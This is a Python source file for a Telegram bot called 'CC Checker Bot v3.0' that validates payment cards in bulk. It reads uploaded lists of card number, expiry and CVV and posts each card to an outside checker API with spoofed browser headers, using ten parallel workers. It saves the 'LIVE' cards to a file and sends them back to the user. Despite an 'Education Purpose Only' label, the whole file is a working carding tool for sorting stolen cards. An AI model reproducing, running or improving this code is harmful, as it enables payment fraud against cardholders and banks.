#!/usr/bin/env python3
"""
CC Checker Telegram Bot v3.0 - FAST (10 Workers)
Education Purpose Only
Author: RV

Railway Compatible - Reads BOT_TOKEN from env variable
10 parallel workers for maximum speed

Commands:
/start - Welcome
/check - Upload cards file
/rvoutput - Get all LIVE cards
/stats - View rvoutput stats
/help - Show help
"""

import re
import os
import sys
import time
import json
import requests
import threading
from queue import Queue
from collections import Counter

# ============ BOT TOKEN FROM ENV ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")

if not BOT_TOKEN:
    print("[ERROR] BOT_TOKEN not set in environment variables!")
    print("[INFO] Set BOT_TOKEN in Railway Variables tab.")
    sys.exit(1)

API_BASE = "https://api.telegram.org/bot" + BOT_TOKEN

# ============ API CONFIG ============
CC_API_URL = "https://uncoder.eu.org/cc-checker/api.php"
CC_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Referer": "https://uncoder.eu.org/cc-checker/",
    "Origin": "https://uncoder.eu.org",
    "Accept": "application/json",
    "X-Requested-With": "XMLHttpRequest"
}

NUM_WORKERS = 10

# ============ RVOUPUT ============
def get_rvoutput_path():
    return os.path.join(os.getcwd(), "rvoutput.txt")

def append_to_rvoutput(cards):
    if not cards: return 0
    rv_path = get_rvoutput_path()
    existing = set()
    if os.path.exists(rv_path):
        with open(rv_path, 'r') as f:
            for line in f: existing.add(line.strip())

    new_count = 0
    with open(rv_path, 'a') as f:
        for card in cards:
            line = card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv']
            if line not in existing:
                f.write(line + "\n")
                existing.add(line)
                new_count += 1
    return new_count

def get_rvoutput_count():
    rv_path = get_rvoutput_path()
    if os.path.exists(rv_path):
        with open(rv_path, 'r') as f:
            return len([l for l in f if l.strip()])
    return 0

# ============ CARD NETWORK ============
def get_card_network(card_number):
    card_str = str(card_number)
    if card_str.startswith('4'): return 'VISA'
    elif card_str[:2] in ['51','52','53','54','55'] or (222100 <= int(card_str[:6]) <= 272099): return 'MASTERCARD'
    elif card_str[:2] in ['34','37']: return 'AMEX'
    elif card_str[:4] == '6011' or card_str[:3] in ['644','645','646','647','648','649'] or (622126 <= int(card_str[:6]) <= 622925): return 'DISCOVER'
    elif card_str[:2] in ['62','81']: return 'UNIONPAY'
    elif card_str[:3] in ['300','301','302','303','304','305'] or card_str[:2] in ['36','38','39']: return 'DINERS'
    elif card_str[:2] in ['35']: return 'JCB'
    else: return 'UNKNOWN'

# ============ 10 API CALLERS ============
def ac1(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac2(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac3(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac4(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac5(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac6(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac7(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac8(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac9(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)
def ac10(cn,mm,yy,cv): return requests.post(CC_API_URL, data={"data": cn+"|"+mm+"|"+yy+"|"+cv}, headers=CC_HEADERS, timeout=15)

api_callers = [ac1, ac2, ac3, ac4, ac5, ac6, ac7, ac8, ac9, ac10]

def check_card_api(card_num, mm, yy, cvv, caller_idx, retries=2):
    for attempt in range(retries + 1):
        try:
            resp = api_callers[caller_idx](card_num, mm, yy, cvv)
            if resp.status_code == 200:
                try: return resp.json()
                except: return {"status": "error", "message": "Invalid JSON"}
            else: return {"status": "error", "message": "HTTP " + str(resp.status_code)}
        except requests.exceptions.Timeout:
            if attempt < retries: time.sleep(1); continue
            return {"status": "error", "message": "Timeout"}
        except requests.exceptions.ConnectionError:
            if attempt < retries: time.sleep(1); continue
            return {"status": "error", "message": "Connection Error"}
        except Exception as e: return {"status": "error", "message": str(e)}
    return {"status": "error", "message": "Max retries"}

def parse_result(api_result, card_num, mm, yy, cvv):
    network = get_card_network(card_num)
    status = api_result.get("status", "unknown")
    message = api_result.get("message", "Unknown")
    if status == "live":
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "LIVE", "reason": message}
    elif status == "die":
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "DIE", "reason": message}
    else:
        return {"card": card_num, "mm": mm, "yy": yy, "cvv": cvv, "network": network, "status": "UNKNOWN", "reason": message}

# ============ TELEGRAM API ============
def send_message(chat_id, text, parse_mode="HTML"):
    try:
        requests.post(API_BASE + "/sendMessage", json={"chat_id": chat_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}, timeout=10)
    except: pass

def send_document(chat_id, file_path, caption=""):
    try:
        with open(file_path, 'rb') as f:
            requests.post(API_BASE + "/sendDocument", files={'document': f}, data={'chat_id': chat_id, 'caption': caption}, timeout=30)
    except Exception as e:
        send_message(chat_id, "<b>Error:</b> <code>" + str(e) + "</code>")

def edit_message(chat_id, message_id, text, parse_mode="HTML"):
    try:
        requests.post(API_BASE + "/editMessageText", json={"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode, "disable_web_page_preview": True}, timeout=10)
    except: pass

def send_status_message(chat_id, text):
    try:
        resp = requests.post(API_BASE + "/sendMessage", json={"chat_id": chat_id, "text": text, "parse_mode": "HTML"}, timeout=10)
        return resp.json()["result"]["message_id"]
    except: return None

# ============ FAST PROCESSING ============
def process_file_fast(file_path, chat_id, status_msg_id):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f if l.strip()]
    except Exception as e:
        edit_message(chat_id, status_msg_id, "<b>❌ Error:</b> <code>" + str(e) + "</code>")
        return

    # Parse valid cards
    valid_cards = []
    for line in lines:
        m = re.match(r'(\d{16})\|(\d{2})\|(\d{2})\|(\d{3})', line)
        if m: valid_cards.append(m.groups())

    total = len(valid_cards)
    if total == 0:
        edit_message(chat_id, status_msg_id, "<b>❌ No valid cards found!</b>")
        return

    task_q = Queue()
    live_r = []
    die_r = []
    unknown_r = []
    checked = [0]
    lock = threading.Lock()
    start = time.time()

    for card in valid_cards:
        task_q.put(card)

    # Update status
    edit_message(chat_id, status_msg_id,
        "<b>🚀 FAST CHECK STARTED</b>\n\n"
        "<b>📁 Total:</b> <code>" + str(total) + "</code>\n"
        "<b>⚡ Workers:</b> <code>" + str(NUM_WORKERS) + "</code>\n"
        "<b>⏳ Progress:</b> <code>0/" + str(total) + "</code>\n"
        "<b>✅ LIVE:</b> <code>0</code> | <b>❌ DIE:</b> <code>0</code>\n\n"
        "<i>Checking at ~" + str(NUM_WORKERS * 0.5) + " cards/sec... ⏳</i>")

    def worker(wid):
        while True:
            try:
                item = task_q.get(timeout=5)
                if item is None: break

                cn, mm, yy, cv = item
                res = check_card_api(cn, mm, yy, cv, wid)
                result = parse_result(res, cn, mm, yy, cv)

                with lock:
                    checked[0] += 1
                    if result["status"] == "LIVE": live_r.append(result)
                    elif result["status"] == "DIE": die_r.append(result)
                    else: unknown_r.append(result)

                    # Update every 10 cards
                    if checked[0] % 10 == 0 or checked[0] == total:
                        prog = checked[0] / total
                        elap = time.time() - start
                        spd = checked[0] / elap if elap > 0 else 0
                        eta = (total - checked[0]) / spd if spd > 0 else 0

                        edit_message(chat_id, status_msg_id,
                            "<b>🚀 CHECKING...</b>\n\n"
                            "<b>📁 Total:</b> <code>" + str(total) + "</code>\n"
                            "<b>⏳ Progress:</b> <code>" + str(checked[0]) + "/" + str(total) + " (" + str(round(prog*100, 1)) + "%)</code>\n"
                            "<b>⚡ Speed:</b> <code>" + str(round(spd, 1)) + " c/s</code> | <b>ETA:</b> <code>" + str(round(eta)) + "s</code>\n"
                            "<b>✅ LIVE:</b> <code>" + str(len(live_r)) + "</code> | <b>❌ DIE:</b> <code>" + str(len(die_r)) + "</code>\n\n"
                            "<i>Please wait... ⏳</i>")

                task_q.task_done()
            except: break

    threads = []
    for i in range(min(NUM_WORKERS, total)):
        t = threading.Thread(target=worker, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)

    task_q.join()

    for _ in range(len(threads)): task_q.put(None)
    for t in threads: t.join(timeout=2)

    elap = time.time() - start

    # Append to rvoutput
    new_count = append_to_rvoutput(live_r)
    total_live = get_rvoutput_count()

    # Final summary
    summary = ("<b>📊 CHECKING COMPLETE</b>\n\n"
               "<b>✅ LIVE:</b> <code>" + str(len(live_r)) + "</code>\n"
               "<b>❌ DIE:</b> <code>" + str(len(die_r)) + "</code>\n"
               "<b>⚠️ UNKNOWN:</b> <code>" + str(len(unknown_r)) + "</code>\n\n"
               "<b>⏱ Time:</b> <code>" + str(round(elap, 1)) + "s</code> | "
               "<b>⚡ Speed:</b> <code>" + str(round(checked[0]/elap, 1)) + " c/s</code>\n\n"
               "<b>📝 New to rvoutput:</b> <code>" + str(new_count) + "</code>\n"
               "<b>💾 Total in rvoutput:</b> <code>" + str(total_live) + "</code>")

    edit_message(chat_id, status_msg_id, summary)

    # Send LIVE cards
    if live_r:
        live_text = "<b>✅ LIVE CARDS:</b>\n\n"
        for card in live_r:
            live_text += "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"

        if len(live_text) > 4000:
            chunks = []
            current = "<b>✅ LIVE CARDS:</b>\n\n"
            for card in live_r:
                line = "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"
                if len(current) + len(line) > 4000:
                    chunks.append(current)
                    current = "<b>✅ LIVE (cont.):</b>\n\n" + line
                else: current += line
            chunks.append(current)
            for chunk in chunks: send_message(chat_id, chunk)
        else: send_message(chat_id, live_text)

    # Send DIE cards (limited)
    if die_r:
        die_text = "<b>❌ DIE CARDS:</b>\n\n"
        for card in die_r[:30]:
            die_text += "<code>" + card['card'] + "|" + card['mm'] + "|" + card['yy'] + "|" + card['cvv'] + "</code>\n"
        if len(die_r) > 30: die_text += "\n<i>... and " + str(len(die_r) - 30) + " more</i>"
        send_message(chat_id, die_text)

    # Cleanup
    try: os.remove(file_path)
    except: pass

# ============ COMMAND HANDLERS ============
def handle_start(chat_id):
    send_message(chat_id, """<b>🃏 CC Checker Bot v3.0 - FAST</b>

<i>Education Purpose Only | By RV</i>

<b>⚡ Features:</b>
• 10 parallel workers
• ~5 cards/second speed
• Auto-save to rvoutput.txt

<b>📋 Commands:</b>
<code>/check</code> - Upload cards file
<code>/rvoutput</code> - Get rvoutput.txt
<code>/stats</code> - View stats
<code>/help</code> - Show help

<b>📁 Format:</b>
<code>CARD|MM|YY|CVV</code>

<b>💾 LIVE cards auto-save to rvoutput.txt</b>""")

def handle_help(chat_id): handle_start(chat_id)

def handle_stats(chat_id):
    rv_count = get_rvoutput_count()
    rv_path = get_rvoutput_path()

    networks = Counter()
    if os.path.exists(rv_path):
        with open(rv_path, 'r') as f:
            for line in f:
                if '|' in line:
                    networks[get_card_network(line.split('|')[0])] += 1

    text = ("<b>📊 Bot Statistics</b>\n\n"
            "<b>✅ Bot:</b> Online\n"
            "<b>⚡ Workers:</b> <code>" + str(NUM_WORKERS) + "</code>\n"
            "<b>💾 rvoutput.txt:</b> <code>" + str(rv_count) + "</code> LIVE cards\n\n")

    if networks:
        text += "<b>By Network:</b>\n"
        for net, cnt in networks.most_common():
            text += "  " + net + ": <code>" + str(cnt) + "</code>\n"

    text += "\n<i>Bot ready!</i>"
    send_message(chat_id, text)

def handle_rvoutput(chat_id):
    rv_path = get_rvoutput_path()
    if not os.path.exists(rv_path):
        send_message(chat_id, "<b>❌ rvoutput.txt not found!</b>\n\n<i>No LIVE cards yet.</i>")
        return
    count = get_rvoutput_count()
    send_document(chat_id, rv_path, "<b>📁 rvoutput.txt</b>\n<b>Total LIVE:</b> <code>" + str(count) + "</code>")

def handle_check(chat_id):
    send_message(chat_id, "<b>📤 Send Cards File</b>\n\nUpload a <code>.txt</code> file with format:\n<code>CARD|MM|YY|CVV</code>\n\n<i>One card per line</i>")

def handle_document(chat_id, file_id, file_name):
    if not file_name.endswith('.txt'):
        send_message(chat_id, "<b>❌ Invalid file!</b>\n\nSend <code>.txt</code> only.")
        return

    # Download
    try:
        resp = requests.post(API_BASE + "/getFile", json={"file_id": file_id}, timeout=10)
        file_path = resp.json()["result"]["file_path"]
    except:
        send_message(chat_id, "<b>❌ Download error!</b>"); return

    try:
        file_resp = requests.get("https://api.telegram.org/file/bot" + BOT_TOKEN + "/" + file_path, timeout=30)
        temp_path = "/tmp/" + file_name
        with open(temp_path, 'wb') as f: f.write(file_resp.content)
    except:
        send_message(chat_id, "<b>❌ Save error!</b>"); return

    status_msg = send_status_message(chat_id, "<b>🚀 Processing...</b>\n\n<i>Please wait ⏳</i>")
    thread = threading.Thread(target=process_file_fast, args=(temp_path, chat_id, status_msg))
    thread.start()

# ============ POLLING ============
def get_updates(offset=None):
    try:
        params = {"timeout": 30, "limit": 100}
        if offset: params["offset"] = offset
        resp = requests.get(API_BASE + "/getUpdates", params=params, timeout=35)
        return resp.json().get("result", [])
    except: return []

def process_update(update):
    if "message" not in update: return
    msg = update["message"]
    chat_id = msg["chat"]["id"]

    if "text" in msg:
        text = msg["text"]
        if text == "/start": handle_start(chat_id)
        elif text == "/help": handle_help(chat_id)
        elif text == "/stats": handle_stats(chat_id)
        elif text == "/rvoutput": handle_rvoutput(chat_id)
        elif text == "/check": handle_check(chat_id)
        else: send_message(chat_id, "<b>❓ Unknown!</b> Use <code>/help</code>")

    elif "document" in msg:
        doc = msg["document"]
        handle_document(chat_id, doc["file_id"], doc.get("file_name", "unknown.txt"))

# ============ MAIN ============
def main():
    print("=" * 55)
    print("  CC CHECKER TELEGRAM BOT v3.0 - FAST")
    print("  10 Workers | Railway Compatible")
    print("=" * 55)
    print("")
    print("  Token: " + BOT_TOKEN[:15] + "...")
    print("  Workers: " + str(NUM_WORKERS))
    print("  rvoutput: " + get_rvoutput_path())
    print("")
    print("  Starting...")
    print("  Press Ctrl+C to stop")
    print("")

    offset = None
    while True:
        try:
            updates = get_updates(offset)
            for update in updates:
                offset = update["update_id"] + 1
                threading.Thread(target=process_update, args=(update,)).start()
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n  Stopped!"); break
        except Exception as e:
            print("  Error: " + str(e)); time.sleep(5)

if __name__ == "__main__":
    main()
